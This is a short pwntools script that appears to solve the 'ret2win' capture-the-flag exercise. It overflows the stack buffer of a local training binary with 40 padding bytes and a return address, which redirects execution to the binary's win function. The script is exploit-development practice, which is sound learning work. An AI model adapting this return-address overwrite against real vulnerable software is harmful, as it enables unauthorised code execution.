from pwn import *

exe = './ret2win'
context.binary = exe
context.log_level = 'debug'

p = process(exe)

offset = 40
ret2win_addr = 0x400756

payload = b'A' * offset
payload += p64(ret2win_addr)

p.sendline(payload)
p.interactive()
